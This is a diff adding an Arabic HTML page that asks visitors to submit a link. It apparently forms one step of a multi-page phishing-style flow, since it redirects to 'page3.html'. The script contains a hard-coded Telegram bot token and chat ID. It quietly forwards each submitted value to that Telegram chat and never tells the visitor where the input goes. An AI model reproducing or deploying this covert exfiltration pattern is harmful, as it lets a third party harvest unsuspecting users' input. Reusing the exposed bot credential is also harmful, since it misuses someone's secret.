@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إدخال الرابط</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #333; /* أسود غامق */
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+            color: white;
+            text-align: center;
+        }
+        .login-box {
+            background: #222; /* أسود غامق */
+            padding: 40px 50px;
+            border-radius: 15px;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.3);
+            width: 350px;
+            border: 2px solid #f39c12; /* أصفر */
+        }
+        h2 {
+            margin-bottom: 20px;
+            color: #f39c12; /* أصفر */
+            font-size: 30px;
+            font-weight: bold;
+            letter-spacing: 2px;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            margin: 10px 0;
+            border: 2px solid #f39c12; /* أصفر */
+            border-radius: 10px;
+            font-size: 18px;
+            background-color: #333; /* أسود غامق */
+            color: #f39c12; /* أصفر */
+            box-sizing: border-box;
+            transition: border-color 0.3s ease;
+        }
+        input:focus {
+            border-color: #95a5a6; /* فضي غامق */
+            outline: none;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: #f39c12; /* أصفر */
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            cursor: pointer;
+            transition: background 0.3s ease;
+        }
+        button:hover {
+            background: #e67e22; /* أصفر داكن */
+        }
+        .message {
+            margin-top: 20px;
+            font-size: 16px;
+        }
+        .success {
+            color: #2ecc71; /* أخضر فاتح */
+        }
+        .error {
+            color: #e74c3c; /* أحمر */
+        }
+        .message span {
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2>🌐 أدخل الرابط الخاص بك 📲</h2>
+        <input type="text" id="urlInput" placeholder="أدخل الرابط هنا">
+        <button onclick="submitUrl()">✅ إرسال الرابط</button>
+        <div id="message" class="message"></div>
+    </div>
+
+    <script>
+        const token = "7236431533:AAH9fiEAyySsO9_1OYoy2KmIWLYTqce1_88"; // التوكن الخاص بك
+        const chatID = "7862056955"; // الإيدي الخاص بك
+
+        function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        console.log("تم إرسال الرسالة بنجاح");
+                    } else {
+                        console.log("فشل في إرسال الرسالة");
+                    }
+                })
+                .catch(error => console.error("خطأ في الاتصال بتلجرام:", error));
+        }
+
+        function submitUrl() {
+            const urlInput = document.getElementById("urlInput").value.trim();
+            const messageDiv = document.getElementById("message");
+
+            // التحقق من صحة الرابط
+            const urlPattern = /^(ftp|http|https):\/\/[^ "]+$/;
+            if (urlInput.trim() === "") {
+                messageDiv.className = "message error";
+                messageDiv.innerHTML = "⚠️ من فضلك أدخل رابطًا صالحًا!";
+            } else if (!urlPattern.test(urlInput)) {
+                messageDiv.className = "message error";
+                messageDiv.innerHTML = "❌ الرابط غير صالح، تأكد من إدخاله بشكل صحيح!";
+            } else {
+                messageDiv.className = "message success";
+                messageDiv.innerHTML = `✅ تم إرسال الرابط بنجاح! <span>${urlInput}</span> 🎉`;
+
+                // إرسال الرسالة إلى تلجرام
+                sendToTelegram(`تم إدخال الرابط بنجاح: ${urlInput}`);
+
+                setTimeout(() => {
+                    window.location.href = "page3.html"; // رابط إلى الصفحة التالية
+                }, 2000);
+            }
+        }
+    </script>
+</body>
+</html>
